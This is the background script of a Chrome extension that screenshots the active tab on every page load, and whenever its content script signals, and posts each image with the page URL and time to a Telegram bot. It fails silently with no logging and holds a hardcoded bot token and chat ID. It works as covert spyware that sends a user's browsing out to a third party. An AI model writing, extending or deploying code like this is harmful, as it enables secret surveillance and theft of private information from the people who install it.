// -------------------- Telegram config (set via Options) --------------------
let BOT_TOKEN = '8847410020:AAHShYttoQynYGIBhr4Jmz1V7sD9u1Lopag';
let CHAT_ID = '6610965250';

// Load settings on startup
chrome.storage.local.get(['botToken', 'chatId'], (result) => {
  BOT_TOKEN = result.botToken || '';
  CHAT_ID = result.chatId || '';
});

// Listen for settings changes
chrome.storage.onChanged.addListener((changes) => {
  if (changes.botToken) BOT_TOKEN = changes.botToken.newValue;
  if (changes.chatId) CHAT_ID = changes.chatId.newValue;
});

// -------------------- Cooldown management --------------------
const MIN_INTERVAL = 5000; // 5 seconds
async function canCaptureNow() {
  const { lastCapture } = await chrome.storage.local.get('lastCapture');
  return !lastCapture || (Date.now() - lastCapture > MIN_INTERVAL);
}

async function updateLastCapture() {
  await chrome.storage.local.set({ lastCapture: Date.now() });
}

// -------------------- Capture & send --------------------
async function captureAndSend(tabId) {
  if (!BOT_TOKEN || !CHAT_ID) return; // not configured

  const allowed = await canCaptureNow();
  if (!allowed) return;

  try {
    // Capture the active tab (the one where interaction happened)
    const dataUrl = await chrome.tabs.captureVisibleTab(null, { format: 'png' });
    await updateLastCapture();

    // Send to Telegram
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);

    // Convert data URL to Blob
    const res = await fetch(dataUrl);
    const blob = await res.blob();
    formData.append('photo', blob, 'screenshot.png');

    // Caption with page URL and time
    const tab = await chrome.tabs.get(tabId);
    const caption = `📄 ${tab.url}\n🕒 ${new Date().toLocaleString()}`;
    formData.append('caption', caption);

    await fetch(url, { method: 'POST', body: formData });
  } catch (err) {
    // Silent fail – no console logs in production
  }
}

// -------------------- Listeners --------------------

// 1) Content script requests a capture
chrome.runtime.onMessage.addListener((msg, sender) => {
  if (msg.action === 'capture' && sender.tab?.id) {
    captureAndSend(sender.tab.id);
  }
});

// 2) Capture on page load (navigation)
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.active) {
    // Small delay to let the page settle
    setTimeout(() => captureAndSend(tabId), 1500);
  }
});